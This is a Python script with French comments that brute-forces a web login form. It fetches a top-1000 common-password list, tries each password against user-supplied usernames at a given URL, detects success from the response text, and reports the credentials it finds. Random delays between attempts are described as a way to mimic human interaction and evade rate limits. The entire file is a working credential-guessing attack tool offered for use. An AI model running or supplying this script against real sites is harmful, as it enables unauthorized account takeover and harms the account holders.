import requests  # Importation de la bibliothèque requests pour effectuer des requêtes HTTP
import itertools  # Importation de la bibliothèque itertools pour les opérations itératives (non utilisé dans ce script)
import random  # Importation de la bibliothèque random pour générer des nombres aléatoires
import time  # Importation de la bibliothèque time pour gérer les délais

def download_password_list(url):
    response = requests.get(url)  # Envoi d'une requête GET à l'URL fournie pour télécharger la liste de mots de passe
    if response.status_code == 200:  # Vérification si la requête a réussi (code 200)
        return response.text.splitlines()  # Retourne la liste de mots de passe sous forme de liste de chaînes
    else:
        print("Failed to download the password list.")  # Message d'erreur si la requête échoue
        return []  # Retourne une liste vide en cas d'échec

def brute_force_login(url, usernames, passwords):
    session = requests.Session()  # Création d'une session pour réutiliser les connexions TCP
    found_credentials = []  # Liste pour stocker les identifiants trouvés

    for username in usernames:  # Boucle sur chaque nom d'utilisateur
        for password in passwords:  # Boucle sur chaque mot de passe
            print(f"Trying {username} / {password}")  # Affichage de la tentative de connexion
            data = {'username': username, 'password': password}  # Données du formulaire de connexion
            try:
                response = session.post(url, data=data, timeout=10)  # Envoi d'une requête POST avec les données de connexion
                if 'Connexion réussie' in response.text:  # Vérification si la réponse contient "Connexion réussie"
                    print(f'Success! Credentials found: {username} / {password}')  # Affichage du succès de la connexion
                    found_credentials.append((username, password))  # Ajout des identifiants trouvés à la liste
                    break  # Sort de la boucle des mots de passe si une connexion réussie est trouvée
            except requests.exceptions.RequestException as e:  # Gestion des exceptions de requête
                print(f"Error during login attempt for {username}: {e}")  # Affichage de l'erreur
            time.sleep(random.uniform(1, 3))  # Délai aléatoire pour imiter l'interaction humaine et éviter les limites de taux

    return found_credentials  # Retourne la liste des identifiants trouvés

def get_user_input():
    url = input("Saisissez l'URL du formulaire de connexion : ")  # Demande à l'utilisateur de saisir l'URL du formulaire de connexion
    choice = input("Choisissez la méthode de saisie du nom d'utilisateur :\na. Nom d'utilisateur depuis une base de donnée\nb. Nom d'utilisateur au choix\nEntrez votre choix (a/b): ")  # Choix de la méthode de saisie du nom d'utilisateur
    
    if choice.lower() == 'a':
        usernames = ['user1', 'user2', 'user3']  # Exemple de noms d'utilisateur, remplacer par un appel API si nécessaire
    elif choice.lower() == 'b':
        username = input("Entrer le nom d'utilisateur de votre choix : ")  # Demande à l'utilisateur de saisir un nom d'utilisateur
        usernames = [username]
    
    password_list_url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000.txt"  # URL de la liste de mots de passe
    passwords = download_password_list(password_list_url)  # Téléchargement de la liste de mots de passe

    if usernames and passwords:  # Vérifie que les listes de noms d'utilisateur et de mots de passe ne sont pas vides
        found_credentials = brute_force_login(url, usernames, passwords)  # Exécution de l'attaque brute force
        if found_credentials:  # Vérifie si des identifiants ont été trouvés
            for user, pwd in found_credentials:  # Affichage des identifiants trouvés
                print(f'Found credentials: {user} / {pwd}')
        else:
            print("No valid credentials found.")  # Message si aucun identifiant valide n'est trouvé
    else:
        print("Missing usernames or passwords data.")  # Message si les données de noms d'utilisateur ou de mots de passe manquent

if __name__ == "__main__":
    get_user_input()  # Appel de la fonction principale si le script est exécuté directement
